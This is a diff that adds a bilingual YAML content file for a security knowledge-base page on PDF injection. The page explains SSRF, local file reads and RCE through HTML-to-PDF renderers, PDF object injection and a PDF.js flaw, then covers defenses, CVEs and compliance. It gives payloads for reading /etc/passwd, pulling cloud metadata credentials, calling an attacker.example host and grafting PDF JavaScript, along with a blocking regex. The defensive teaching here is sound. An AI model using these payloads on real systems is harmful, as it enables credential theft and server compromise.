@@ -1,0 +1,390 @@
+meta:
+  id: pdfinjection
+  threatId: cat_1_research28
+  severity: Critical
+  color: '#701a75'
+  colorRgb: 112,26,117
+  cwe: CWE-918
+  cvss: '9.8'
+  standard: OWASP A10:2021
+hero:
+  titleMain: 'PDF '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: PDF Injection (HTML-to-PDF SSRF/LFI, PDF Object Injection, PDF.js XSS)
+  lead:
+    en: '"PDF injection" is not one vulnerability -- it''s an umbrella over three genuinely distinct mechanisms that all three independent research passes insisted on separating rather than merging. By far the dominant real-world case, confirmed against the strongest incident record: an app renders untrusted HTML/CSS through a server-side PDF generator (wkhtmltopdf, DomPDF, TCPDF, Puppeteer/headless Chrome) that is really a full resource-fetching browser engine running with the SERVER''s network position and filesystem access -- turning an injected &lt;iframe&gt; or &lt;img&gt; into Server-Side Request Forgery or local file disclosure. The other two variants -- injecting raw PDF object syntax to smuggle a JavaScript action into the file itself, and exploiting a PDF viewer''s own parsing bugs -- are real, documented by name-brand research (Gareth Heyes/PortSwigger, Black Hat EU 2020) and a landmark PDF.js CVE, but have a far thinner incident record.'
+    pl: '"Wstrzyknięcie PDF" to nie jedna podatność -- to parasol nad trzema naprawdę odrębnymi mechanizmami które wszystkie trzy niezależne przejścia badawcze nalegały rozdzielić zamiast łączyć. Zdecydowanie dominujący przypadek z praktyki, potwierdzony najsilniejszym rejestrem incydentów: aplikacja renderuje nieufny HTML/CSS przez generator PDF po stronie serwera (wkhtmltopdf, DomPDF, TCPDF, Puppeteer/headless Chrome) który jest w rzeczywistości pełnym silnikiem przeglądarki pobierającym zasoby, działającym z pozycją sieciową i dostępem do systemu plików SERWERA -- zamieniając wstrzyknięty &lt;iframe&gt; albo &lt;img&gt; w Server-Side Request Forgery albo ujawnienie lokalnego pliku. Pozostałe dwa warianty -- wstrzyknięcie surowej składni obiektu PDF by przemycić akcję JavaScript do samego pliku, i eksploatacja błędów parsowania samej przeglądarki PDF -- są prawdziwe, udokumentowane przez badanie z nazwiskiem (Gareth Heyes/PortSwigger, Black Hat EU 2020) i flagowe CVE PDF.js, ale mają znacznie
+      szczuplejszy rejestr incydentów.'
+  metrics:
+  - k: CWE-918
+    v:
+      en: Weakness ID (dominant variant)
+      pl: ID słabości (dominujący wariant)
+  - k: '9.8'
+    v: CVSS · Critical (CVE-2022-35583, wkhtmltopdf)
+  - k: A10:2021
+    v:
+      en: OWASP Top 10 (SSRF, not A03)
+      pl: OWASP Top 10 (SSRF, nie A03)
+  - k: '3'
+    v:
+      en: Distinct mechanisms under one name
+      pl: Odrębne mechanizmy pod jedną nazwą
+  sources:
+  - label: CVE-2022-35583 (wkhtmltopdf SSRF, GitHub Advisory)
+    url: https://github.com/advisories/GHSA-v2fj-q75c-65mr
+  - label: OWASP A10:2021 SSRF
+    url: https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+  - label: 'PortSwigger Research — Portable Data exFiltration: XSS for PDFs'
+    url: https://portswigger.net/research/portable-data-exfiltration
+  - label: CVE-2024-4367 (PDF.js) — GitLab advisory
+    url: https://gitlab.com/gitlab-org/gitlab/-/issues/artifacts
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: 'Three mechanisms, ranked by real-world prevalence: server-side HTML-to-PDF SSRF/LFI dominates the incident record; PDF object/structure injection is real, name-brand research with a thin CVE trail; PDF-viewer parsing bugs are a library-bug class, not something you introduce by writing application code.'
+      pl: 'Trzy mechanizmy, uszeregowane wg rozpowszechnienia w praktyce: SSRF/LFI przez HTML-to-PDF po stronie serwera dominuje rejestr incydentów; wstrzyknięcie obiektu/struktury PDF to prawdziwe badanie z nazwiskiem ze szczupłym śladem CVE; błędy parsowania przeglądarki PDF to klasa błędów biblioteki, nie coś co wprowadzasz pisząc kod aplikacji.'
+    items:
+    - name: HTML-to-PDF local file disclosure (file://)
+      sev: critical
+      description:
+        en: The PDF renderer is a real (or WebKit-derived) browser engine running server-side. Injecting <iframe src="file:///etc/passwd"> or <img src="file://..."> makes the SERVER read that file and embed its content into the returned PDF, which the attacker then downloads.
+        pl: Renderer PDF to prawdziwy (albo wywodzący się z WebKit) silnik przeglądarki działający po stronie serwera. Wstrzyknięcie <iframe src="file:///etc/passwd"> albo <img src="file://..."> sprawia że SERWER odczytuje ten plik i osadza jego zawartość w zwróconym PDF, który atakujący potem pobiera.
+      payload: <iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
+    - name: HTML-to-PDF SSRF (internal services / cloud metadata)
+      sev: critical
+      description:
+        en: The same resource-fetch primitive targeted at internal hosts or cloud metadata endpoints (169.254.169.254) reaches IAM credentials, internal APIs, and internal port-scan results -- the single most-reported real-world PDF-injection scenario across bug bounty and pentest writeups.
+        pl: Ten sam prymityw pobierania zasobów wycelowany w hosty wewnętrzne albo endpointy metadanych chmury (169.254.169.254) dosięga poświadczeń IAM, wewnętrznych API, i wyników skanowania portów wewnętrznych -- najczęściej zgłaszany scenariusz wstrzyknięcia PDF w praktyce w bug bounty i pentestach.
+      payload: <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
+    - name: CSS-only bypass (survives naive tag stripping)
+      sev: high
+      description:
+        en: When <iframe>/<img>/<script> tags are filtered, CSS @import and url() still trigger the same server-side fetch primitive -- both HTML-tag allowlisting and CSS need to be sanitized, not just the former.
+        pl: Gdy tagi <iframe>/<img>/<script> są filtrowane, CSS @import i url() wciąż wyzwalają ten sam prymityw pobierania po stronie serwera -- zarówno allowlist tagów HTML jak i CSS muszą być sanityzowane, nie tylko to pierwsze.
+      payload: <style>@import url("http://collaborator-host/x"); body{background:url("file:///etc/hostname")}</style>
+    - name: DomPDF/TCPDF library RCE escalation (font-cache poisoning, phar deserialization)
+      sev: critical
+      description:
+        en: In DomPDF specifically (CVE-2022-28368), an injected @font-face rule pointing at an attacker-hosted "font" whose real content is PHP gets cached with a .php extension in a web-reachable directory -- turning HTML injection into remote code execution. Both DomPDF and TCPDF have separate phar:// deserialization RCE chains (CVE-2021-3838, CVE-2018-17057) reachable the same way.
+        pl: Konkretnie w DomPDF (CVE-2022-28368), wstrzyknięta reguła @font-face wskazująca na "font" hostowany przez atakującego którego prawdziwa zawartość to PHP zostaje zbuforowana z rozszerzeniem .php w katalogu dostępnym przez web -- zamieniając wstrzyknięcie HTML w zdalne wykonanie kodu. Zarówno DomPDF jak i TCPDF mają osobne łańcuchy RCE deserializacji phar:// (CVE-2021-3838, CVE-2018-17057) osiągalne w ten sam sposób.
+      payload: '@font-face { font-family: x; src: url(''http://attacker.example/evil.php''); }  -- evil.php is a valid TTF header prefix + PHP payload'
+    - name: PDF object/structure injection ("XSS for PDFs")
+      sev: high
+      description:
+        en: 'Credited research: Gareth Heyes, PortSwigger, Black Hat EU 2020 "Portable Data exFiltration: XSS for PDFs". When a library programmatically builds a PDF and writes untrusted text into a string/annotation URI without escaping parentheses, an attacker closes the string and grafts raw PDF dictionary syntax -- an /OpenAction or /AA carrying /S /JavaScript. Verified affected libraries from PortSwigger''s own research: pdf-lib and jsPDF (both hardened by maintainers after disclosure).'
+        pl: 'Uznane badanie: Gareth Heyes, PortSwigger, Black Hat EU 2020 "Portable Data exFiltration: XSS for PDFs". Gdy biblioteka programowo buduje PDF i zapisuje nieufny tekst w string/URI adnotacji bez escapowania nawiasów, atakujący zamyka string i wszczepia surową składnię słownika PDF -- /OpenAction albo /AA niosące /S /JavaScript. Zweryfikowane dotknięte biblioteki z własnego badania PortSwigger: pdf-lib i jsPDF (oba utwardzone przez maintainerów po ujawnieniu).'
+      payload: /blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(   -- closes the string, closes the dict, grafts a JS OpenAction
+    - name: PDF-viewer parsing bug -> browser-origin XSS (PDF.js)
+      sev: high
+      description:
+        en: 'CVE-2024-4367: a missing type check on a font''s FontMatrix value in PDF.js (<4.2.67) let attacker-controlled data reach an eval-capable path, executing JavaScript in the WEB ORIGIN hosting the viewer (Firefox itself, or any app embedding pdf.js) -- not just a sandboxed PDF context. This is a library parsing bug, not something an application introduces by generating PDFs.'
+        pl: 'CVE-2024-4367: brakująca kontrola typu wartości FontMatrix czcionki w PDF.js (<4.2.67) pozwoliła danym kontrolowanym przez atakującego dosięgnąć ścieżki zdolnej do eval, wykonując JavaScript w DOMENIE WEB hostującej przeglądarkę (sam Firefox, albo dowolna aplikacja osadzająca pdf.js) -- nie tylko w piaskownicy kontekstu PDF. To błąd parsowania biblioteki, nie coś co aplikacja wprowadza generując PDF.'
+      payload: A crafted PDF with a malformed embedded font FontMatrix array (non-numeric values) -- see Codean Labs' public disclosure for the exact structure
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The fix always has the same three layers: don''t render untrusted HTML/CSS unsanitized, disable the renderer''s local-file and remote-fetch capability, and network-isolate the generation process so a bypass of either doesn''t reach anything sensitive.'
+      pl: 'Naprawa zawsze ma te same trzy warstwy: nie renderuj nieoescapowanego nieufnego HTML/CSS, wyłącz zdolność renderera do lokalnego pliku i zdalnego pobierania, i odizoluj sieciowo proces generowania tak by obejście któregokolwiek nie dosięgło niczego wrażliwego.'
+    languages:
+    - label: Node.js (Puppeteer)
+      lang: javascript
+      vulnerable: 'const html = `<h1>Invoice for ${req.body.name}</h1>${req.body.notes}`;
+
+        const page = await browser.newPage();
+
+        await page.setContent(html);   // raw user HTML rendered by a full browser
+
+        const pdf = await page.pdf();'
+      safe: "const clean = sanitizeHtml(req.body.notes, {\n  allowedTags: ['b','i','p','ul','li','br'], allowedAttributes: {}   // no src/href at all\n});\nconst page = await browser.newPage();\nawait page.setJavaScriptEnabled(false);         // kill script-driven fetch/XHR\nawait page.setRequestInterception(true);\npage.on('request', r => {\n  const u = r.url();\n  const bad = /^(file|ftp):/i.test(u) ||\n    /169\\.254\\.169\\.254|metadata|localhost|127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\./.test(u);\n  bad ? r.abort() : r.continue();\n});\nawait page.setContent(`<h1>Invoice</h1>${clean}`, { waitUntil: 'load' });\n// + run in a network-isolated container with an explicit egress allowlist"
+    - label: PHP (DomPDF)
+      lang: php
+      vulnerable: '$dompdf = new Dompdf([''isRemoteEnabled'' => true]);   // fetches remote URLs + fonts
+
+        $dompdf->loadHtml($_POST[''html'']);                    // raw user HTML
+
+        $dompdf->render();'
+      safe: "$clean = (new HTMLPurifier())->purify($_POST['html']);\n$dompdf = new Dompdf([\n    'isRemoteEnabled'     => false,   // kills the SSRF + font-cache RCE vector at once\n    'isPhpEnabled'        => false,\n    'isJavascriptEnabled' => false,\n    'chroot'              => '/var/app/pdf-assets',   // confine any local file access\n]);\n$dompdf->loadHtml($clean);\n$dompdf->render();\n// + keep dompdf >= 2.0.1 (patches CVE-2022-28368 and the phar deserialization chain)"
+    - label: PDF.js (viewer hardening)
+      lang: javascript
+      vulnerable: const loadingTask = pdfjsLib.getDocument({ url });   // default isEvalSupported=true, pdfjs-dist <4.2.67
+      safe: "const loadingTask = pdfjsLib.getDocument({\n  url,\n  isEvalSupported: false,   // disables the eval-capable code path CVE-2024-4367 abused\n});\n// + keep pdfjs-dist >= 4.2.67"
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: Confirming the dominant variant is a canary-and-escalate exercise identical in spirit to any other SSRF hunt, adapted to a PDF-export feature as the delivery mechanism.
+      pl: Potwierdzenie dominującego wariantu to ćwiczenie kanarek-i-eskaluj identyczne w duchu do każdego innego polowania na SSRF, przystosowane do funkcji eksportu PDF jako mechanizmu dostarczenia.
+    steps:
+    - title:
+        en: Find any feature that turns input into a PDF
+        pl: Znajdź każdą funkcję zamieniającą wejście w PDF
+      description:
+        en: Invoices, reports, résumé/CV builders, tickets, certificates, "export to PDF" -- any feature reflecting user-supplied fields into a generated document.
+        pl: Faktury, raporty, kreatory CV, bilety, certyfikaty, "eksportuj do PDF" -- każda funkcja odzwierciedlająca pola dostarczone przez użytkownika w wygenerowanym dokumencie.
+    - title:
+        en: Fingerprint the renderer
+        pl: Rozpoznaj renderer
+      description:
+        en: Inspect the PDF /Producer and /Creator metadata (via exiftool/pdfinfo) -- it frequently says "wkhtmltopdf", "dompdf", "TCPDF", or a Chromium/Skia signature outright, dictating which payload family and escalation to try.
+        pl: Sprawdź metadane /Producer i /Creator PDF (przez exiftool/pdfinfo) -- często mówią wprost "wkhtmltopdf", "dompdf", "TCPDF", albo sygnaturę Chromium/Skia, dyktując którą rodzinę ładunków i eskalację wypróbować.
+    - title:
+        en: Confirm HTML rendering, then plant an out-of-band canary
+        pl: Potwierdź renderowanie HTML, potem zasadź kanarka out-of-band
+      description:
+        en: Submit benign markup (<b>, <h1>) and check if it renders styled rather than as literal text. Then inject <img src="http://collaborator-host/x"> and watch for a callback -- confirms the server itself is fetching attacker-chosen URLs.
+        pl: Wyślij niegroźny znacznik (<b>, <h1>) i sprawdź czy renderuje się stylizowany zamiast jako dosłowny tekst. Potem wstrzyknij <img src="http://collaborator-host/x"> i obserwuj callback -- potwierdza że sam serwer pobiera URL-e wybrane przez atakującego.
+    - title:
+        en: Escalate to file:// and cloud metadata
+        pl: Eskaluj do file:// i metadanych chmury
+      description:
+        en: Swap the canary for file:///etc/passwd (read the returned PDF for its contents) and 169.254.169.254 metadata paths (cloud credential theft) -- reading the response requires the target content to actually render into the PDF output.
+        pl: Zamień kanarka na file:///etc/passwd (odczytaj zwrócony PDF pod kątem zawartości) i ścieżki metadanych 169.254.169.254 (kradzież poświadczeń chmury) -- odczyt odpowiedzi wymaga by docelowa treść faktycznie wyrenderowała się w wyjściu PDF.
+    - title:
+        en: If tags are filtered, retry with CSS-only vectors
+        pl: Jeśli tagi są filtrowane, spróbuj ponownie wektorami tylko-CSS
+      description:
+        en: '@import and url() in a <style> block trigger the identical server-side fetch primitive and frequently survive naive tag-based sanitization that never inspected CSS.'
+        pl: '@import i url() w bloku <style> wyzwalają identyczny prymityw pobierania po stronie serwera i często przeżywają naiwną sanityzację opartą na tagach która nigdy nie zbadała CSS.'
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: No single layer is sufficient on its own -- sanitization has recurring CSS/parser-differential bypasses, and the renderer's own no-file/no-remote flags have a documented bypass history, which is exactly why network isolation ranks as strong defense-in-depth rather than optional hardening.
+      pl: Żadna pojedyncza warstwa nie jest wystarczająca sama w sobie -- sanityzacja ma powracające obejścia CSS/różnic parserów, a własne flagi bez-pliku/bez-zdalnego renderera mają udokumentowaną historię obejść, dlatego właśnie izolacja sieciowa plasuje się jako silna obrona w głąb, nie opcjonalne utwardzenie.
+    items:
+    - rank: 1
+      eff: 90
+      kind: primary
+      label:
+        en: Don't render untrusted input as HTML at all
+        pl: W ogóle nie renderuj nieufnego wejścia jako HTML
+      note:
+        en: Escape all user values to plain text against a fixed server-side template, or build the PDF from structured data via a non-browser library (e.g. ReportLab) instead of an HTML-to-PDF renderer. Removes the entire class at the root -- the highest-leverage single change.
+        pl: Escapuj wszystkie wartości użytkownika do zwykłego tekstu względem stałego szablonu server-side, albo zbuduj PDF ze strukturalnych danych przez bibliotekę inną niż przeglądarka (np. ReportLab) zamiast rendererem HTML-to-PDF. Usuwa całą klasę u korzenia -- pojedyncza zmiana o najwyższej dźwigni.
+    - rank: 2
+      eff: 85
+      kind: primary
+      label:
+        en: Network-isolate / sandbox the PDF-generation process
+        pl: Odizoluj sieciowo / zamknij w piaskownicy proces generowania PDF
+      note:
+        en: Run generation in a container/namespace with no route to 169.254.169.254, internal ranges, or arbitrary internet -- caps the blast radius of SSRF/LFI even when sanitization or renderer flags are bypassed. Doesn't depend on getting parsing perfectly right, which is why it ranks this high.
+        pl: Uruchamiaj generowanie w kontenerze/namespace bez trasy do 169.254.169.254, wewnętrznych zakresów, albo dowolnego internetu -- ogranicza promień rażenia SSRF/LFI nawet gdy sanityzacja albo flagi renderera zostaną ominięte. Nie zależy od idealnie poprawnego parsowania, dlatego plasuje się tak wysoko.
+    - rank: 3
+      eff: 80
+      kind: strong
+      label:
+        en: Disable the renderer's local-file access and remote fetching
+        pl: Wyłącz dostęp lokalny do plików i zdalne pobieranie renderera
+      note:
+        en: 'Verified concrete flags: wkhtmltopdf --disable-local-file-access; DomPDF isRemoteEnabled=false + chroot; Puppeteer setJavaScriptEnabled(false) + request-interception allowlist (no single built-in "block file://" toggle exists). wkhtmltopdf''s flag specifically has a documented bypass history -- treat as defense-in-depth, not a sole control.'
+        pl: 'Zweryfikowane konkretne flagi: wkhtmltopdf --disable-local-file-access; DomPDF isRemoteEnabled=false + chroot; Puppeteer setJavaScriptEnabled(false) + allowlist przechwytywania żądań (nie ma pojedynczego wbudowanego przełącznika "zablokuj file://"). Flaga wkhtmltopdf konkretnie ma udokumentowaną historię obejść -- traktuj jako obronę w głąb, nie jedyną kontrolę.'
+    - rank: 4
+      eff: 70
+      kind: strong
+      label:
+        en: Sanitize/allowlist HTML AND CSS before rendering
+        pl: Sanityzuj/allowlistuj HTML I CSS przed renderowaniem
+      note:
+        en: HTMLPurifier (PHP) / sanitize-html or DOMPurify server-side (Node) -- must cover CSS @import/url() explicitly, since the CSS-only bypass variant in this deep-dive survives tag-only allowlisting. Effective but bypass-prone alone; pair with ranks 1-3.
+        pl: HTMLPurifier (PHP) / sanitize-html albo DOMPurify server-side (Node) -- musi jawnie pokrywać CSS @import/url(), ponieważ wariant obejścia tylko-CSS w tym deep-dive przeżywa allowlistę tylko-tagów. Skuteczne ale samo w sobie podatne na obejścia; łącz z rangami 1-3.
+    - rank: 5
+      eff: 55
+      kind: weak
+      label:
+        en: Keep the library patched -- or replace it if that is impossible
+        pl: Utrzymuj bibliotekę załataną -- albo zastąp ją jeśli to niemożliwe
+      note:
+        en: 'Meaningful for DomPDF/TCPDF/PDF.js, which have active maintainers and real fixed versions. Verified as effectively impossible for wkhtmltopdf specifically: the project is archived (repo archived 2023-01-02, org archived 2024-07-10, last release 0.12.6 in 2020) and its critical SSRF (CVE-2022-35583) has no upstream fix and never will -- migration off it, not patching, is the real control.'
+        pl: 'Znaczące dla DomPDF/TCPDF/PDF.js, które mają aktywnych maintainerów i prawdziwe załatane wersje. Zweryfikowane jako praktycznie niemożliwe konkretnie dla wkhtmltopdf: projekt jest zarchiwizowany (repo zarchiwizowane 2023-01-02, organizacja 2024-07-10, ostatnie wydanie 0.12.6 w 2020) a jego krytyczne SSRF (CVE-2022-35583) nie ma i nigdy nie będzie mieć naprawy upstream -- migracja z niego, nie łatanie, jest prawdziwą kontrolą.'
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: The dominant HTML-to-PDF variant has by far the richest, most cross-team-corroborated CVE record of any topic in this batch. Three CVE candidates surfaced only by single research passes, all future-dated to 2026 and each explicitly self-flagged by the team that found it as unverified, were excluded per this project's established rule against uncorroborated future-dated CVEs.
+      pl: Dominujący wariant HTML-to-PDF ma zdecydowanie najbogatszy, najbardziej potwierdzony międzyzespołowo rejestr CVE spośród wszystkich tematów w tej partii. Trzy kandydaci CVE ujawnieni tylko przez pojedyncze przejścia badawcze, wszystkie datowane na przyszłość na 2026 i każdy jawnie oflagowany przez zespół który go znalazł jako niepotwierdzony, zostały wykluczone zgodnie z ustaloną regułą tego projektu przeciw niepotwierdzonym przyszłościowym CVE.
+    items:
+    - org: wkhtmltopdf
+      year: 2022
+      impact: CVE-2022-35583 -- CVSS 9.8 Critical, CWE-918
+      cost: No fix -- project archived, will never be patched
+      description:
+        en: 'Injecting an iframe with an internal/metadata IP address as its source reaches SSRF against the initial-access target. Confirmed by all three research passes directly against the GitHub Security Advisory. wkhtmltopdf''s own repository was archived 2023-01-02 and its GitHub organization archived 2024-07-10 (last release: 0.12.6, 2020) -- this specific critical CVE will never receive an upstream fix, making the flagship example of this deep-dive''s "migrate, don''t patch" defense finding.'
+        pl: 'Wstrzyknięcie iframe z wewnętrznym/metadanym adresem IP jako źródłem osiąga SSRF przeciw celowi wstępnego dostępu. Potwierdzone przez wszystkie trzy przejścia badawcze bezpośrednio względem GitHub Security Advisory. Własne repozytorium wkhtmltopdf zostało zarchiwizowane 2023-01-02 a jego organizacja GitHub 2024-07-10 (ostatnie wydanie: 0.12.6, 2020) -- to konkretne krytyczne CVE nigdy nie otrzyma naprawy upstream, czyniąc je flagowym przykładem ustalenia obrony "migruj, nie łataj" tego deep-dive.'
+    - org: DomPDF
+      year: 2022
+      impact: CVE-2022-28368 -- CVSS 9.8 Critical
+      cost: Fixed in 1.2.1
+      description:
+        en: 'An injected @font-face rule pointing at an attacker-hosted file whose real content is PHP gets cached with a .php extension in a web-reachable directory -- turning HTML injection into remote code execution, requiring only isRemoteEnabled left at its (then) default. Research: Positive Security, March 2022. Confirmed by all three passes.'
+        pl: 'Wstrzyknięta reguła @font-face wskazująca na plik hostowany przez atakującego którego prawdziwa zawartość to PHP zostaje zbuforowana z rozszerzeniem .php w katalogu dostępnym przez web -- zamieniając wstrzyknięcie HTML w zdalne wykonanie kodu, wymagając tylko isRemoteEnabled pozostawionego na (ówczesnej) wartości domyślnej. Badanie: Positive Security, marzec 2022. Potwierdzone przez wszystkie trzy przejścia.'
+    - org: TCPDF
+      year: 2018
+      impact: CVE-2018-17057 -- CVSS 9.8 Critical
+      cost: Fixed in 6.2.22
+      description:
+        en: PHP Object Injection via a malicious <link> tag referencing a phar:// archive, versions through 6.2.21 -- a separate RCE chain from DomPDF's, confirmed by all three research passes, reachable through the same HTML-injection entry point.
+        pl: Wstrzyknięcie obiektu PHP przez złośliwy tag <link> odnoszący się do archiwum phar://, wersje do 6.2.21 -- osobny łańcuch RCE od DomPDF, potwierdzony przez wszystkie trzy przejścia badawcze, osiągalny przez ten sam punkt wejścia wstrzyknięcia HTML.
+    - org: PDF.js (Mozilla)
+      year: 2024
+      impact: CVE-2024-4367
+      cost: Fixed in pdfjs-dist 4.2.67 / Firefox 126
+      description:
+        en: A missing type check on a font's FontMatrix value let attacker-controlled data reach an eval-capable path, executing JavaScript in the web origin hosting the viewer -- confirmed by all three passes against Codean Labs' disclosure and the GitLab/Mozilla advisories. The landmark incident for the PDF-viewer-parsing-bug variant.
+        pl: Brakująca kontrola typu wartości FontMatrix czcionki pozwoliła danym kontrolowanym przez atakującego dosięgnąć ścieżki zdolnej do eval, wykonując JavaScript w domenie web hostującej przeglądarkę -- potwierdzone przez wszystkie trzy przejścia względem ujawnienia Codean Labs i advisory GitLab/Mozilla. Flagowy incydent dla wariantu błędu parsowania przeglądarki PDF.
+    - org: pdf-lib and jsPDF (npm)
+      year: 2020
+      impact: 'Research disclosure, not a CVE -- "Portable Data exFiltration: XSS for PDFs"'
+      cost: Hardened by maintainers after disclosure
+      description:
+        en: 'Gareth Heyes (PortSwigger), Black Hat EU 2020: both libraries failed to escape parentheses/backslashes in PDF text strings and annotation URIs, letting an attacker graft a JavaScript /OpenAction into the object structure. The foundational, name-brand research for the PDF-object-injection variant -- a library-hardening finding rather than a mass-exploited CVE, exactly as all three research passes characterized it.'
+        pl: 'Gareth Heyes (PortSwigger), Black Hat EU 2020: obie biblioteki nie escapowały nawiasów/backslashy w stringach tekstowych PDF i URI adnotacji, pozwalając atakującemu wszczepić akcję JavaScript /OpenAction do struktury obiektu. Fundamentalne badanie z nazwiskiem dla wariantu wstrzyknięcia obiektu PDF -- ustalenie utwardzenia biblioteki zamiast masowo eksploatowanego CVE, dokładnie jak scharakteryzowały to wszystkie trzy przejścia badawcze.'
+    inlineSources:
+    - label: CVE-2022-35583 (GitHub Advisory GHSA-v2fj-q75c-65mr)
+      url: https://github.com/advisories/GHSA-v2fj-q75c-65mr
+    - label: CVE-2022-28368 (DomPDF, Rapid7)
+      url: https://www.rapid7.com/db/modules/exploit/multi/http/dompdf_rce_cve_2022_28368/
+    - label: CVE-2018-17057 (TCPDF)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2018-17057
+    - label: 'PortSwigger Research — Portable Data exFiltration: XSS for PDFs'
+      url: https://portswigger.net/research/portable-data-exfiltration
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: This is fundamentally a DAST/manual-testing discipline for the dominant variant -- the vulnerability lives in what a server-side renderer fetches at runtime, which static analysis of application code alone cannot see.
+      pl: To fundamentalnie dyscyplina DAST/testów manualnych dla dominującego wariantu -- podatność żyje w tym co renderer server-side pobiera w czasie wykonania, czego sama analiza statyczna kodu aplikacji nie może zobaczyć.
+    sast:
+    - - SCA / dependency scanning (Snyk, Dependabot)
+      - Flags known-vulnerable or abandoned PDF libraries (wkhtmltopdf, outdated DomPDF/TCPDF) by version -- the practical static check given the dynamic nature of the core vulnerability
+    - - Manual config review
+      - Auditing for isRemoteEnabled=true (DomPDF), missing --disable-local-file-access (wkhtmltopdf), or missing request-interception allowlists (Puppeteer) is effectively the static-analysis equivalent here
+    dast:
+    - - Burp Suite + Collaborator (or interactsh)
+      - The primary confirmation tool for the dominant SSRF/LFI variant -- plant an out-of-band canary in the injectable field and watch for a server-side callback
+    - - exiftool / pdfinfo
+      - Fingerprints the /Producer and /Creator metadata of a generated PDF to identify the renderer and choose the right payload family
+    - - pdfid.py / pdf-parser.py (Didier Stevens) / peepdf
+      - Inspect a target/generated PDF's object structure for /OpenAction, /AA, /JavaScript, /Launch -- the relevant tools for confirming the PDF-object-injection variant
+    note:
+      en: <strong>Key signal:</strong> checking the generated PDF's own /Producer metadata is often the fastest way to identify the exact library and jump straight to its known CVE-specific payloads (font-cache RCE for DomPDF, phar deserialization for TCPDF, iframe SSRF for wkhtmltopdf) rather than testing blind.
+      pl: <strong>Kluczowy sygnał:</strong> sprawdzenie własnych metadanych /Producer wygenerowanego PDF jest często najszybszym sposobem zidentyfikowania dokładnej biblioteki i przejścia wprost do jej znanych ładunków specyficznych dla CVE (RCE przez font-cache dla DomPDF, deserializacja phar dla TCPDF, SSRF przez iframe dla wkhtmltopdf) zamiast testowania na ślepo.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: 'The most important compliance finding here, confirmed independently by all three research passes: the dominant real-world variant of "PDF injection" is officially an SSRF issue (CWE-918, OWASP A10:2021), not an Injection-category (A03) finding -- exactly the kind of instinct-defying mapping this knowledge base insists on stating plainly rather than defaulting to A03 because the threat''s name contains the word "injection."'
+      pl: 'Najważniejsze ustalenie zgodności tutaj, potwierdzone niezależnie przez wszystkie trzy przejścia badawcze: dominujący wariant "wstrzyknięcia PDF" z praktyki jest oficjalnie problemem SSRF (CWE-918, OWASP A10:2021), nie znaleziskiem kategorii Injection (A03) -- dokładnie ten rodzaj mapowania przeczącego instynktowi który ta baza wiedzy nalega jasno stwierdzać zamiast domyślnie przyjmować A03 bo nazwa zagrożenia zawiera słowo "wstrzyknięcie".'
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-918 — Server-Side Request Forgery (primary, for the dominant HTML-to-PDF variant). Verified directly assigned to CVE-2022-35583 on its GitHub Security Advisory.
+      - CWE-94 — Improper Control of Generation of Code (Code Injection) — applies to the DomPDF/TCPDF RCE escalations and, per PortSwigger's own framing, the PDF object/structure injection variant (though all three research passes noted no single MITRE entry cleanly covers the latter -- a genuine judgment call, not a settled fact).
+      - CWE-502 — Deserialization of Untrusted Data — applies specifically to the phar:// deserialization chains in DomPDF and TCPDF.
+      - CWE-79 — Improper Neutralization of Input During Web Page Generation (XSS) — applies to the PDF.js viewer variant, with a root-cause type-confusion classification (CWE-843) alongside it.
+      - CWE-1236 (Improper Neutralization of Formula Elements, i.e. CSV/spreadsheet formula injection) is explicitly NOT applicable here — confirmed by two of three research passes as a sibling threat belonging to CSV export, not PDF generation. Do not conflate the two.
+    - std: OWASP
+      items:
+      - A10:2021 — Server-Side Request Forgery (SSRF), for the dominant variant. This is the category the CWE-918 mapping requires, not A03.
+      - A03:2021 — Injection, for the code/structure-injection sub-variants specifically (RCE escalations, PDF object injection, PDF.js viewer XSS) — a genuine multi-mapping across this single catalog entry, similar in spirit to this knowledge base's SVG Injection deep-dive.
+      - 'A06:2021 — Vulnerable and Outdated Components, worth flagging separately: simply choosing to depend on wkhtmltopdf at all is itself an A06 finding, independent of any specific injection payload, given its unfixable critical CVE and archived status.'
+    inlineSources:
+    - label: CVE-2022-35583 (GitHub Advisory)
+      url: https://github.com/advisories/GHSA-v2fj-q75c-65mr
+    - label: OWASP A10:2021 SSRF
+      url: https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active PDF-injection exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji wstrzyknięcia PDF, przejdź tę listę od góry.
+    steps:
